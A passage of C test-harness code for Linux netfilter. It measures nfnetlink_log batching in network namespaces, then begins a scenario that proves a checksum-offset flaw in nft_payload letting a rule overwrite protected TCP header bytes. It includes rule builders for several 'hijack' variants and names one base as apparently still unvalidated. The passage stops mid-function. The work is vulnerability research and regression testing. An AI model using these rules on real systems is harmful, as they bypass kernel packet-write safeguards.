		f539_write_all(e->cmd, "Q\n", 2);
		f539_read_line(e->ack, line, sizeof(line), 5000);
	}
	if (e->cmd >= 0)
		close(e->cmd);
	if (e->ack >= 0)
		close(e->ack);
	if (e->peer > 0) {
		kill(e->peer, SIGKILL);
		waitpid(e->peer, NULL, 0);
		e->peer = 0;
	}
}

static int f539_peer_request_to(struct f539_env *e, int cnt, int plen, uint32_t dst)
{
	char req[64], line[64];

	snprintf(req, sizeof(req), "S %d %d %u %u\n", cnt, plen, dst, F539_ADDR_PEER);
	if (f539_write_all(e->cmd, req, (int)strlen(req)) < 0)
		return -1;
	if (f539_read_line(e->ack, line, sizeof(line), 30000) < 0)
		return -2;
	{
		int rc = -1, nsent = 0, err = 0;
		unsigned long long tx = 0, txd = 0;

		sscanf(line + 1, "%d %d %d %llu %llu", &rc, &nsent, &err, &tx, &txd);
		e->last_sent = nsent;
		e->last_err = err;
		e->peer_tx = tx;
		e->peer_txdrop = txd;
		if (line[0] != 'D' || rc != 0)
			return -3;
	}
	return 0;
}

static int f539_peer_request(struct f539_env *e, int cnt, int plen)
{
	return f539_peer_request_to(e, cnt, plen, F539_ADDR_DST);
}

/* NFULA_PACKET_HDR = { u16 hw_protocol; u8 hook; u8 pad; }.  f538_parse keeps types and
 * lengths but not payloads, so the hook is scanned here: it turns "the message exists"
 * into "the message came from hook 2", which is the whole claim of this battery. */
static void f539_note_hook(const unsigned char *buf, int len, int *hook_seen,
			   int *hwproto)
{
	const struct nlmsghdr *nlh = (const struct nlmsghdr *)buf;
	int rem = len;

	while (NLMSG_OK(nlh, rem)) {
		if (nlh->nlmsg_type == (uint16_t)((NFNL_SUBSYS_ULOG << 8) | NFULNL_MSG_PACKET)) {
			const unsigned char *p = (const unsigned char *)NLMSG_DATA(nlh);
			int pl = (int)nlh->nlmsg_len - NLMSG_HDRLEN, off = 0;

			if (pl < 4)
				return;
			p += 4;
			pl -= 4;
			while (off + (int)sizeof(struct nlattr) <= pl) {
				const struct nlattr *a = (const struct nlattr *)(p + off);
				int alen = (int)a->nla_len;

				if (alen < (int)sizeof(struct nlattr) || off + alen > pl)
					break;
				if ((a->nla_type & 0x3fff) == 1 && alen >= 7) {
					const unsigned char *d = (const unsigned char *)a +
								 NLA_HDRLEN;

					*hook_seen = d[2];
					*hwproto = (d[0] << 8) | d[1];
					return;
				}
				off += (int)NLA_ALIGN_(alen);
			}
		}
		nlh = NLMSG_NEXT(nlh, rem);
	}
}

static int f539_drain(int fd, struct f538_res *r, int first_ms, int *hook_seen,
		      int *hwproto)
{
	unsigned char buf[131072];
	int got = 0;

	*hook_seen = -1;
	*hwproto = -1;
	while (got < 4096) {
		struct timeval tv;
		int n, ms = got ? 30 : first_ms;

		tv.tv_sec = ms / 1000;
		tv.tv_usec = (ms % 1000) * 1000;
		setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
		n = (int)recv(fd, buf, sizeof(buf), 0);
		if (n <= 0)
			break;
		got++;
		f538_parse(buf, n, r);
		if (*hook_seen < 0)
			f539_note_hook(buf, n, hook_seen, hwproto);
	}
	r->batches += got;
	return got;
}

/* the same table+chain+rule the F15 battery used, but the chain is parametrised */
static int f539_setup(const char *tab, int group, int qthresh, int mark, int hook,
		      char *out, size_t n, int *fdp)
{
	int fd, errs;

	nops = 0;
	nrecs = 0;
	op_newtable(tab);
	op_newchain(tab, "c", hook, 0, NF_ACCEPT);
	if (f538_rule(tab, "c", group, qthresh, NULL, mark) == NULL) {
		snprintf(out, n, "setup=BUILD_FAIL");
		return -1;
	}
	fd = nfl_ulog_open(group, qthresh);
	if (fd < 0) {
		snprintf(out, n, "setup=ULOG_OPEN_%d", fd);
		return -1;
	}
	errs = nf_flush();
	if (errs < 0) {
		snprintf(out, n, "setup=SENDFAIL_%d", errs);
		close(fd);
		return -1;
	}
	if (errs > 0) {
		snprintf(out, n, "setup=ERR|errno=%d|extack=%.80s",
			 g_err ? -g_err : 0, g_extack[0] ? g_extack : "none");
		close(fd);
		return 0;
	}
	*fdp = fd;
	return 1;
}

/* ---- 1. ATTRS in FORWARD: what the kernel writes when both devices are known ---- */
static int f539_attrs(int mark, int hook, const char *cfg, char *out, size_t n)
{
	struct f539_env e;
	struct f538_res r;
	char list[256];
	char env[64];
	int fd = -1, k, i, off = 0, hook_seen = -1, hwproto = -1;

	memset(&r, 0, sizeof(r));
	if (f539_env_open(&e, out, n) < 0) {
		f539_env_close(&e);
		return 0;
	}
	snprintf(env, sizeof(env), "mtu0=%d|ipfwd=%d", f539_mtu_get("fv0"), e.ipfwd);
	k = f539_setup("at", 20, 1, mark, hook, out, n, &fd);
	if (k <= 0) {
		f539_env_close(&e);
		return 0;
	}
	if (f539_peer_request_to(&e, 1, 64,
				 hook == NF_INET_LOCAL_IN ? F539_ADDR_ME : F539_ADDR_DST) != 0) {
		snprintf(out, n, "cfg=%s|setup=PEER_SEND_FAIL", cfg);
		close(fd);
		f539_env_close(&e);
		return 0;
	}
	f539_drain(fd, &r, 400, &hook_seen, &hwproto);
	close(fd);
	f539_env_close(&e);
	list[0] = 0;
	for (i = 0; i < r.nattr; i++)
		off += snprintf(list + off, sizeof(list) - (size_t)off, "%s%u:%d",
				i ? "," : "", r.at[i].type, r.at[i].len);
	snprintf(out, n, "cfg=%s|setup=OK|msgs=%d|mlen=%d|nattr=%d|attr_bytes=%d|"
		 "sum_ok=%d|payload_attr=%d|ts=%d|hwaddr=%d|prefix_attr=%d|hook=%d|hwproto=%04x|%s|attrs=%s",
		 cfg, r.msgs, r.mlen, r.nattr, r.attr_bytes,
		 r.sum_mismatch == 0 ? 1 : 0, r.payload_attr, r.dstamp_len,
		 r.hwaddr_len, r.prefix_len, hook_seen, hwproto, env, list);
	return 0;
}

static int sc_f539_attrs_fwd(char *o, size_t n)  { return f539_attrs(0, NF_INET_FORWARD, "fwd", o, n); }
static int sc_f539_attrs_fwdm(char *o, size_t n) { return f539_attrs(1, NF_INET_FORWARD, "fwd-mark", o, n); }
static int sc_f539_attrs_in(char *o, size_t n)   { return f539_attrs(0, NF_INET_LOCAL_IN, "in", o, n); }

/* the same rule in LOCAL_IN needs a packet addressed to this namespace: the far side
 * sends to 10.9.0.1 instead of 10.8.0.5.  A second far-side target, one line of code,
 * and the F15 numbers come back from the same binary in the same boot. */

/* ---- 2. CLASS in FORWARD: where the reservation stops fitting kmalloc-4096 ---- */
static int f539_class(char *out, size_t n)
{
	struct f539_env e;
	int p, group = 300, last1 = -1, first2 = -1, frag = 0;
	char vec[256];
	int off = 0;

	if (f539_env_open(&e, out, n) < 0) {
		f539_env_close(&e);
		return 0;
	}
	vec[0] = 0;
	for (p = 3480; p <= 3800; p += 4) {
		struct f538_res r;
		char tab[16];
		int fd = -1, k;

		group++;
		snprintf(tab, sizeof(tab), "k%d", group);
		nops = 0;
		nrecs = 0;
		op_newtable(tab);
		op_newchain(tab, "c", NF_INET_FORWARD, 0, NF_ACCEPT);
		if (f538_rule(tab, "c", group, 1000, NULL, 0) == NULL)
			break;
		fd = nfl_ulog_open(group, 1000);
		if (fd < 0)
			break;
		k = nf_flush();
		if (k != 0) {
			close(fd);
			break;
		}
		memset(&r, 0, sizeof(r));
		if (f539_peer_request(&e, 6, p) != 0) {
			close(fd);
			break;
		}
		f538_drain(fd, &r, 300);
		close(fd);
		if (r.msgs != 6)
			frag++;
		if (r.max_dgram_msgs == 1)
			last1 = p;
		else if (r.max_dgram_msgs >= 2 && first2 < 0)
			first2 = p;
		off += snprintf(vec + off, sizeof(vec) - (size_t)off, "%s%d",
				off ? "," : "", r.max_dgram_msgs);
	}
	f539_env_close(&e);
	snprintf(out, n, "setup=OK|last_1msg=%d|first_2msg=%d|frag_probes=%d|nsent=%d|nerr=%d|"
		 "vec3480_3800=%s", last1, first2, frag, e.last_sent, e.last_err, vec);
	return 0;
}

/* ---- 3. BOUND in FORWARD: the largest payload that still gives two messages ---- */
static int f539_bound(int mark, char *out, size_t n)
{
	struct f539_env e;
	int p, last_two = -1, first_one = -1, group = 500;
	char vec[256];
	int off = 0;

	if (f539_env_open(&e, out, n) < 0) {
		f539_env_close(&e);
		return 0;
	}
	vec[0] = 0;
	for (p = 1600; p <= 1800; p += 4) {
		struct f538_res r;
		char tab[16];
		int fd = -1, k;

		group++;
		snprintf(tab, sizeof(tab), "b%d", group);
		nops = 0;
		nrecs = 0;
		op_newtable(tab);
		op_newchain(tab, "c", NF_INET_FORWARD, 0, NF_ACCEPT);
		if (f538_rule(tab, "c", group, 2, NULL, mark) == NULL)
			break;
		fd = nfl_ulog_open(group, 2);
		if (fd < 0)
			break;
		k = nf_flush();
		if (k != 0) {
			close(fd);
			break;
		}
		memset(&r, 0, sizeof(r));
		if (f539_peer_request(&e, 2, p) != 0) {
			close(fd);
			break;
		}
		f538_drain(fd, &r, 300);
		close(fd);
		if (r.max_dgram_msgs >= 2)
			last_two = p;
		else if (r.max_dgram_msgs == 1 && first_one < 0)
			first_one = p;
		if (p >= 1680 && p <= 1740)
			off += snprintf(vec + off, sizeof(vec) - (size_t)off, "%s%d",
					off ? "," : "", r.max_dgram_msgs);
	}
	f539_env_close(&e);
	snprintf(out, n, "cfg=%s|setup=OK|last_two=%d|first_one=%d|vec1680_1740=%s",
		 mark ? "fwd-mark" : "fwd", last_two, first_one, vec);
	return 0;
}

static int sc_f539_bound_fwd(char *o, size_t n)  { return f539_bound(0, o, n); }
static int sc_f539_bound_fwdm(char *o, size_t n) { return f539_bound(1, o, n); }

/* ---- 4. WARN in FORWARD: six packets in the tightest legal batches ---- */
static int f539_warn(int paylen, int mark, char *out, size_t n)
{
	struct f539_env e;
	struct f538_res r;
	int fd = -1, k;

	memset(&r, 0, sizeof(r));
	if (f539_env_open(&e, out, n) < 0) {
		f539_env_close(&e);
		return 0;
	}
	k = f539_setup("wn", 22, 2, mark, NF_INET_FORWARD, out, n, &fd);
	if (k <= 0) {
		f539_env_close(&e);
		return 0;
	}
	if (f539_peer_request(&e, 6, paylen) != 0) {
		snprintf(out, n, "setup=PEER_SEND_FAIL");
		close(fd);
		f539_env_close(&e);
		return 0;
	}
	f538_drain(fd, &r, 600);
	close(fd);
	f539_env_close(&e);
	snprintf(out, n, "setup=OK|sent=6|payload=%d|msgs=%d|batches=%d|done=%d|"
		 "max_dgram_msgs=%d|mlen=%d|lost=%d|nsent=%d|nerr=%d", paylen, r.msgs,
		 r.batches, r.done_seen, r.max_dgram_msgs, r.mlen, 6 - r.msgs,
		 e.last_sent, e.last_err);
	return 0;
}

static int sc_f539_warn_1716p(char *o, size_t n) { return f539_warn(1716, 0, o, n); }
static int sc_f539_warn_1712m(char *o, size_t n) { return f539_warn(1712, 1, o, n); }

/* ---- 5. controls ---- */
static int sc_f539_ctl_norule(char *out, size_t n)
{
	struct f539_env e;
	struct f538_res r;
	int fd;

	memset(&r, 0, sizeof(r));
	if (f539_env_open(&e, out, n) < 0) {
		f539_env_close(&e);
		return 0;
	}
	fd = nfl_ulog_open(30, 1);
	if (fd < 0) {
		snprintf(out, n, "setup=ULOG_OPEN_%d", fd);
		f539_env_close(&e);
		return 0;
	}
	if (f539_peer_request(&e, 1, 64) != 0) {
		snprintf(out, n, "setup=PEER_SEND_FAIL");
		close(fd);
		f539_env_close(&e);
		return 0;
	}
	f538_drain(fd, &r, 400);
	close(fd);
	f539_env_close(&e);
	snprintf(out, n, "setup=OK|sent=1|msgs=%d|ipfwd=1|rule=none", r.msgs);
	return 0;
}

static int sc_f539_ctl_noipfwd(char *out, size_t n)
{
	struct f539_env e;
	struct f538_res r;
	int fd = -1, k;

	memset(&r, 0, sizeof(r));
	if (f539_env_open(&e, out, n) < 0) {
		f539_env_close(&e);
		return 0;
	}
	k = f539_setup("nf", 31, 1, 0, NF_INET_FORWARD, out, n, &fd);
	if (k <= 0) {
		f539_env_close(&e);
		return 0;
	}
	f539_sysctl("/proc/sys/net/ipv4/ip_forward", "0");
	if (f539_peer_request(&e, 1, 64) != 0) {
		snprintf(out, n, "setup=PEER_SEND_FAIL");
		close(fd);
		f539_env_close(&e);
		return 0;
	}
	f538_drain(fd, &r, 400);
	close(fd);
	f539_sysctl("/proc/sys/net/ipv4/ip_forward", "1");
	f539_env_close(&e);
	snprintf(out, n, "setup=OK|sent=1|msgs=%d|ipfwd=0|rule=forward", r.msgs);
	return 0;
}

/* one 3592-byte datagram through FORWARD: if the MTU were 1500 the stack would fragment
 * it into three packets, three FORWARD visits and three messages -- this control makes
 * that failure visible instead of silently inflating every count */
static int sc_f539_ctl_big(char *out, size_t n)
{
	struct f539_env e;
	struct f538_res r;
	int fd = -1, k;

	memset(&r, 0, sizeof(r));
	if (f539_env_open(&e, out, n) < 0) {
		f539_env_close(&e);
		return 0;
	}
	k = f539_setup("bg", 32, 1, 0, NF_INET_FORWARD, out, n, &fd);
	if (k <= 0) {
		f539_env_close(&e);
		return 0;
	}
	if (f539_peer_request(&e, 1, 3592) != 0) {
		snprintf(out, n, "setup=PEER_SEND_FAIL");
		close(fd);
		f539_env_close(&e);
		return 0;
	}
	f538_drain(fd, &r, 500);
	close(fd);
	f539_env_close(&e);
	snprintf(out, n, "setup=OK|sent=1|payload=3592|msgs=%d|mlen=%d|nsent=%d|nerr=%d",
		 r.msgs, r.mlen, e.last_sent, e.last_err);
	return 0;
}

/* one boot's worth of diagnosis: every setup step's return code, and the kernel's own
 * view of the two namespaces.  This prints numbers, not a verdict. */
static int sc_f539_diag(char *out, size_t n)
{
	struct f539_env e;
	char devs[256], rt[256], arp[256];
	FILE *f;
	int off;

	if (f539_env_open(&e, out, n) < 0) {
		char why[128];

		snprintf(why, sizeof(why), "%s", out);
		snprintf(out, n, "setup=FAIL|why=%s|rc_veth=%d|rc_move=%d|rc_addr=%d|"
			 "rc_route=%d|rc_mtu=%d|rc_arp=%d",
			 why, e.rc_veth, e.rc_move, e.rc_addr, e.rc_route,
			 e.rc_mtu, e.rc_arp);
		f539_env_close(&e);
		return 0;
	}
	devs[0] = rt[0] = arp[0] = 0;
	f = fopen("/proc/net/dev", "r");
	if (f) {
		char line[256];
		int skip = 2;

		off = 0;
		while (fgets(line, sizeof(line), f)) {
			char name[32];

			if (skip-- > 0)
				continue;
			if (sscanf(line, " %31[^:]:", name) == 1)
				off += snprintf(devs + off, sizeof(devs) - (size_t)off,
						"%s%s", off ? "," : "", name);
		}
		fclose(f);
	}
	f = fopen("/proc/net/route", "r");
	if (f) {
		char line[256];
		int skip = 1;

		off = 0;
		while (fgets(line, sizeof(line), f)) {
			char name[32], dst[32], gw[32];

			if (skip-- > 0)
				continue;
			if (sscanf(line, "%31s %31s %31s", name, dst, gw) == 3)
				off += snprintf(rt + off, sizeof(rt) - (size_t)off, "%s%s:%s/%s",
						off ? "," : "", name, dst, gw);
		}
		fclose(f);
	}
	f = fopen("/proc/net/arp", "r");
	if (f) {
		char line[256];
		int skip = 1;

		off = 0;
		while (fgets(line, sizeof(line), f)) {
			char ip[32], hw[32], dev[32];

			if (skip-- > 0)
				continue;
			if (sscanf(line, "%31s 0x%*x %31s %31s", ip, hw, dev) == 3)
				off += snprintf(arp + off, sizeof(arp) - (size_t)off,
						"%s%s=%s", off ? "," : "", ip, hw);
		}
		fclose(f);
	}
	f539_env_close(&e);
	snprintf(out, n, "setup=OK|rc_veth=%d|rc_move=%d|rc_addr=%d|rc_route=%d|"
		 "rc_mtu=%d|rc_mac=%d|rc_arp=%d|rc_up=%d|mtu=%d|ipfwd=%d|devs=%s|rt=%s|arp=%s",
		 e.rc_veth, e.rc_move, e.rc_addr, e.rc_route, e.rc_mtu, e.rc_mac,
		 e.rc_arp, e.rc_up, f539_mtu_get("fv0"), e.ipfwd, devs, rt, arp);
	return 0;
}

/* where do packets 2..n die: in the far side's stack, on the pair, or in this
 * namespace after ip_rcv?  No rule is installed, so nothing here can be the culprit. */
static int sc_f539_stats(char *out, size_t n)
{
	struct f539_env e;
	struct f539_devstat a, b;
	unsigned long long ir0 = 0, fw0 = 0, ir1 = 0, fw1 = 0;

	if (f539_env_open(&e, out, n) < 0) {
		f539_env_close(&e);
		return 0;
	}
	f539_devstat("fv0", &a);
	f539_snmp(&ir0, &fw0);
	if (f539_peer_request(&e, 6, 200) != 0) {
		snprintf(out, n, "setup=REQUEST_FAIL|rx0=%llu", a.rx_pkts);
		f539_env_close(&e);
		return 0;
	}
	usleep(50000);
	f539_devstat("fv0", &b);
	f539_snmp(&ir1, &fw1);
	f539_env_close(&e);
	snprintf(out, n, "setup=OK|fv0_rx_before=%llu|fv0_rx_after=%llu|fv0_rx_delta=%llu|"
		 "fv0_rx_errs=%llu|fv0_rx_drop=%llu|fv1_tx=%llu|fv1_txdrop=%llu|nsent=%d|nerr=%d|"
		 "inrecv_delta=%llu|forw_delta=%llu",
		 a.rx_pkts, b.rx_pkts, b.rx_pkts - a.rx_pkts, b.rx_errs, b.rx_drop,
		 e.peer_tx, e.peer_txdrop, e.last_sent, e.last_err,
		 ir1 - ir0, fw1 - fw0);
	return 0;
}

/* the decisive pair: the same six datagrams, once with no rule (how many crossed the
 * wire) and once with the filtered FORWARD rule (how many the log expression saw).
 * forw_delta is the kernel's own ForwDatagrams counter, so "the hook ran N times" is
 * not inferred from my own messages. */
static int sc_f539_stats_rule(char *out, size_t n)
{
	struct f539_env e;
	struct f539_devstat a, b;
	struct f538_res r;
	unsigned long long ir0 = 0, fw0 = 0, ir1 = 0, fw1 = 0;
	int fd = -1, k, hook_seen = -1, hwproto = -1;

	memset(&r, 0, sizeof(r));
	if (f539_env_open(&e, out, n) < 0) {
		f539_env_close(&e);
		return 0;
	}
	k = f539_setup("st", 33, 1000, 0, NF_INET_FORWARD, out, n, &fd);
	if (k <= 0) {
		f539_env_close(&e);
		return 0;
	}
	f539_devstat("fv0", &a);
	f539_snmp(&ir0, &fw0);
	if (f539_peer_request(&e, 6, 200) != 0) {
		snprintf(out, n, "setup=REQUEST_FAIL");
		close(fd);
		f539_env_close(&e);
		return 0;
	}
	f539_drain(fd, &r, 600, &hook_seen, &hwproto);
	usleep(50000);
	f539_devstat("fv0", &b);
	f539_snmp(&ir1, &fw1);
	close(fd);
	f539_env_close(&e);
	snprintf(out, n, "setup=OK|sent=6|payload=200|msgs=%d|batches=%d|hook=%d|"
		 "fv0_rx_delta=%llu|forw_delta=%llu|inrecv_delta=%llu|nsent=%d|nerr=%d",
		 r.msgs, r.batches, hook_seen, b.rx_pkts - a.rx_pkts, fw1 - fw0,
		 ir1 - ir0, e.last_sent, e.last_err);
	return 0;
}

static void run_f539(void)
{
	run_new("f539.diag", sc_f539_diag, 90);
	run_new("f539.stats", sc_f539_stats, 90);
	run_new("f539.stats.rule", sc_f539_stats_rule, 90);
	run_new("f539.fwd.attrs.plain", sc_f539_attrs_fwd, 90);
	run_new("f539.fwd.attrs.mark", sc_f539_attrs_fwdm, 90);
	run_new("f539.in.attrs.plain", sc_f539_attrs_in, 90);
	run_new("f539.ctl.norule", sc_f539_ctl_norule, 90);
	run_new("f539.ctl.noipfwd", sc_f539_ctl_noipfwd, 90);
	run_new("f539.ctl.big", sc_f539_ctl_big, 90);
	run_new("f539.fwd.bound.plain", sc_f539_bound_fwd, 900);
	run_new("f539.fwd.bound.mark", sc_f539_bound_fwdm, 900);
	run_new("f539.fwd.warn.1716.plain", sc_f539_warn_1716p, 120);
	run_new("f539.fwd.warn.1712.mark", sc_f539_warn_1712m, 120);
	run_new("f539.fwd.class", f539_class, 900);
}

/*
 * differ540_add.c -- turn 540: the checksum-offset side channel.
 *
 * WHY THIS SCENARIO EXISTS
 * ------------------------
 * nft_payload_set_eval() stores the rule's bytes at `base + offset`, and when
 * NFTA_PAYLOAD_CSUM_TYPE is NFT_PAYLOAD_CSUM_INET it ALSO rewrites a checksum
 * field at `base + csum_offset`.  Those are two different positions, and until
 * c2226f0c7f ("netfilter: nft_payload: restrict checksum offsets to known
 * values", 2026-09-05) the second one was an arbitrary u8 chosen by the rule.
 *
 * So on the pre-fix code a rule that passes every store check can still write
 * two bytes anywhere at or after the transport header: store at offset 20 (the
 * payload, explicitly allowed) with csum_offset 12 (the TCP data-offset byte,
 * explicitly protected by nft_th_write_ok()) and the checksum fixup lands on
 * the byte the other check was written to defend.
 *
 * The door is measured on the tree that SHIPPED: tree A is linux-7.3.4 with
 * c2226f0c7f reverted, and its net/netfilter/nft_payload.c is byte-identical
 * to v7.3's file (build_f17.sh checks that).  Tree B is linux-7.3.4 as
 * released.  Same tarball, same config, one hunk apart.
 *
 * WHAT IS MEASURED, NOT ASSUMED
 * -----------------------------
 * One hand-built Ethernet+IPv4+TCP frame is injected on fv1 by the far
 * namespace; the near side forwards it (hook FORWARD, priority 0) with the rule
 * installed, and the frame comes back out fv0 to the far side, whose AF_PACKET
 * socket reads the 20 bytes of the TCP header back.  So the report is the
 * packet's actual bytes after the kernel processed it, not a return code.
 *
 *   csum.ctl.norule     no rule at all: the bytes of an untouched frame
 *   csum.ctl.legal      store 4B at transport+20, csum_offset 16 (tcphdr.check):
 *                       accepted on both trees, doff must stay 0x50
 *   csum.hijack.doff    store 4B at transport+20, csum_offset 12 (doff byte):
 *                       A accepted + byte 12 rewritten, B -EINVAL
 *   csum.hijack.ack     same with csum_offset 8 (ack_seq): the channel is not
 *                       about doff, it is about "anywhere at all"
 *   csum.ctl.store_doff store at transport+12 with no csum: rejected on BOTH
 *                       (nft_th_write_ok, the fix that WAS in v7.3)
 *   csum.ctl.nh_ihl     store 4B at network+0 (version/ihl): rejected on BOTH
 *                       (nft_nh_write_ok)
 */

#include <poll.h>

#define C540_NORULE       0
#define C540_LEGAL        1
#define C540_HIJACK_DOFF  2
#define C540_HIJACK_ACK   3
#define C540_STORE_DOFF   4
#define C540_NH_IHL       5
#define C540_HIJACK_PROTO6 6   /* csum_offset 6 = offsetof(udphdr,check), on a TCP packet */
#define C540_HIJACK_INNER  7   /* base = inner header: csum_offset is never validated     */

#define F540_TCP_PLEN 16

static void c540_payload_set(struct nlmsghdr *nlh, uint32_t sreg, uint32_t base,
			     uint32_t off, uint32_t len, int csum_type,
			     int csum_off)
{
	struct nlattr *e, *d;

	e = nest_start(nlh, NFTA_LIST_ELEM, "c540.elem");
	put_str(nlh, NFTA_EXPR_NAME, "payload", "c540.name");
	d = nest_start(nlh, NFTA_EXPR_DATA, "c540.data");
	put_be32(nlh, NFTA_PAYLOAD_SREG, sreg, "c540.sreg");
	put_be32(nlh, NFTA_PAYLOAD_BASE, base, "c540.base");
	put_be32(nlh, NFTA_PAYLOAD_OFFSET, off, "c540.offset");
	put_be32(nlh, NFTA_PAYLOAD_LEN, len, "c540.len");
	if (csum_type) {
		put_be32(nlh, NFTA_PAYLOAD_CSUM_TYPE, (uint32_t)csum_type,
			 "c540.csum_type");
		put_be32(nlh, NFTA_PAYLOAD_CSUM_OFFSET, (uint32_t)csum_off,
			 "c540.csum_offset");
	}
	nest_end(nlh, d);
	nest_end(nlh, e);
}

/* the probe lives in the INIT netns, so a table left behind keeps its chain
 * registered at priority 0 and fires on the NEXT scenario's packet.  Measured:
 * without this, ctl.store_doff and ctl.nh_ihl (both accepted at init, both
 * refused at run time) reported the checksum update of the PREVIOUS scenario's
 * rule -- th=...d2d0 instead of the untouched wire bytes. */
static void op_deltable_f540(const char *table)
{
	struct nlmsghdr *nlh;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_DELTABLE,
			NLM_F_REQUEST | NLM_F_ACK, NFPROTO_IPV4);
	put_str(nlh, NFTA_TABLE_NAME, table, "c540.deltable");
	nops++;
}

static struct nlmsghdr *op_newrule_f540(const char *table, const char *chain,
					int prog)
{
	struct nlmsghdr *nlh;
	struct nlattr *exprs;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_APPEND,
			NFPROTO_IPV4);
	put_str(nlh, NFTA_RULE_TABLE, table, "c540.rule.table");
	put_str(nlh, NFTA_RULE_CHAIN, chain, "c540.rule.chain");
	exprs = nest_start(nlh, NFTA_RULE_EXPRESSIONS, "c540.rule.exprs");

	switch (prog) {
	case C540_LEGAL:
		exfil_imm_value(nlh, NFT_REG32_00, g_reg_const, 4);
		c540_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_TRANSPORT_HEADER,
				 20, 4, NFT_PAYLOAD_CSUM_INET, 16);
		break;
	case C540_HIJACK_DOFF:
		exfil_imm_value(nlh, NFT_REG32_00, g_reg_const, 4);
		c540_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_TRANSPORT_HEADER,
				 20, 4, NFT_PAYLOAD_CSUM_INET, 12);
		break;
	case C540_HIJACK_ACK:
		exfil_imm_value(nlh, NFT_REG32_00, g_reg_const, 4);
		c540_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_TRANSPORT_HEADER,
				 20, 4, NFT_PAYLOAD_CSUM_INET, 8);
		break;
	case C540_STORE_DOFF:
		exfil_imm_value(nlh, NFT_REG32_00, g_reg_const, 4);
		c540_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_TRANSPORT_HEADER,
				 12, 2, 0, 0);
		break;
	case C540_NH_IHL:
		exfil_imm_value(nlh, NFT_REG32_00, g_reg_const, 4);
		c540_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_NETWORK_HEADER,
				 0, 4, 0, 0);
		break;
	case C540_HIJACK_PROTO6:
		/* 6 is a legal csum_offset (UDP's check field), so the CONTROL PLANE of
		 * the fixed kernel accepts the rule; only the run-time half
		 * (nft_payload_csum_th_write_ok, pkt->tprot) knows this is TCP. */
		exfil_imm_value(nlh, NFT_REG32_00, g_reg_const, 4);
		c540_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_TRANSPORT_HEADER,
				 20, 4, NFT_PAYLOAD_CSUM_INET, 6);
		break;
	case C540_HIJACK_INNER:
		/* the one base whose csum_offset is still unvalidated in BOTH planes */
		exfil_imm_value(nlh, NFT_REG32_00, g_reg_const, 4);
		c540_payload_set(nlh, NFT_REG32_00, 3 /* INNER_HEADER */,
				 20, 4, NFT_PAYLOAD_CSUM_INET, 12);
		break;
	default:
		return NULL;
	}
	nest_end(nlh, exprs);
	nops++;
	return nlh;
}

/* ---- far side: build one Ethernet+IPv4+TCP frame, send it, read it back ---- */
static int f540_peer_tcp(int cnt, int *nsent, int *err, unsigned char *th,
			 int *ncap)
{
	struct sockaddr_ll sll;
	struct pollfd pfd;
	unsigned char *f, buf[2048];
	int s, i, idx = f539_ifindex("fv1");
	int plen = F540_TCP_PLEN;
	int flen = 14 + 20 + 20 + plen;

	*nsent = 0;
	*err = 0;
	*ncap = 0;
	memset(th, 0, 20);
	if (idx < 0)
		return 41;
	s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (s < 0)
		return 42;
	f = calloc(1, (size_t)flen);
	if (!f) {
		close(s);
		return 43;
	}
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_IP);
	sll.sll_ifindex = idx;
	sll.sll_halen = 6;
	memcpy(sll.sll_addr, f539_mac_me, 6);

	/* drain anything already queued (gratuitous ARP and friends) */
	while (recv(s, buf, sizeof(buf), MSG_DONTWAIT) > 0)
		;

	for (i = 0; i < cnt; i++) {
		uint32_t saddr = htonl(F539_ADDR_PEER), daddr = htonl(F539_ADDR_DST);
		unsigned char *ip = f + 14;
		unsigned char *tcp = ip + 20;
		ssize_t w;

		memcpy(f, f539_mac_me, 6);
		memcpy(f + 6, f539_mac_far, 6);
		f[12] = 0x08;
		f[13] = 0x00;
		memset(ip, 0, 20);
		ip[0] = 0x45;
		ip[2] = (unsigned char)((20 + 20 + plen) >> 8);
		ip[3] = (unsigned char)((20 + 20 + plen) & 0xff);
		ip[4] = 0x00;
		ip[5] = (unsigned char)(0x50 + i);
		ip[8] = 64;
		ip[9] = IPPROTO_TCP;
		memcpy(ip + 12, &saddr, 4);
		memcpy(ip + 16, &daddr, 4);
		*(unsigned short *)(ip + 10) = htons(f539_csum(ip, 20));

		memset(tcp, 0, 20);
		tcp[0] = 0x9c;                  /* sport 40000                    */
		tcp[1] = 0x40;
		tcp[2] = (unsigned char)(F539_PORT >> 8);
		tcp[3] = (unsigned char)(F539_PORT & 0xff);
		tcp[4] = 0x11;                  /* seq 0x11223344                 */
		tcp[5] = 0x22;
		tcp[6] = 0x33;
		tcp[7] = 0x44;
		tcp[12] = 0x50;                 /* doff = 5, the byte door B kills */
		tcp[13] = 0x02;                 /* SYN                             */
		tcp[14] = 0xff;
		tcp[15] = 0xff;                 /* window                          */
		/* checksum left 0: a forwarded packet is not checksum-verified,
		 * and a wrong csum here would only make the far side look away. */
		memset(tcp + 20, 0x77, (size_t)plen);

		w = sendto(s, f, (size_t)flen, 0, (struct sockaddr *)&sll, sizeof(sll));
		if (w < 0) {
			if (!*err)
				*err = errno;
		} else {
			(*nsent)++;
		}
	}

	/* read the frames that come back out of fv0 (hairpin forward) */
	pfd.fd = s;
	pfd.events = POLLIN;
	for (i = 0; i < 30 && *ncap < cnt; i++) {
		struct sockaddr_ll from;
		socklen_t fl = sizeof(from);
		ssize_t r;

		if (poll(&pfd, 1, 100) <= 0)
			continue;
		r = recvfrom(s, buf, sizeof(buf), MSG_DONTWAIT,
			     (struct sockaddr *)&from, &fl);
		if (r < 40)
			continue;
		if (from.sll_pkttype == PACKET_OUTGOING)
			continue;               /* our own transmission          */
		if (buf[12] != 0x08 || buf[13] != 0x00)
			continue;               /* not IPv4                      */
		if (buf[14 + 9] != IPPROTO_TCP)
			continue;
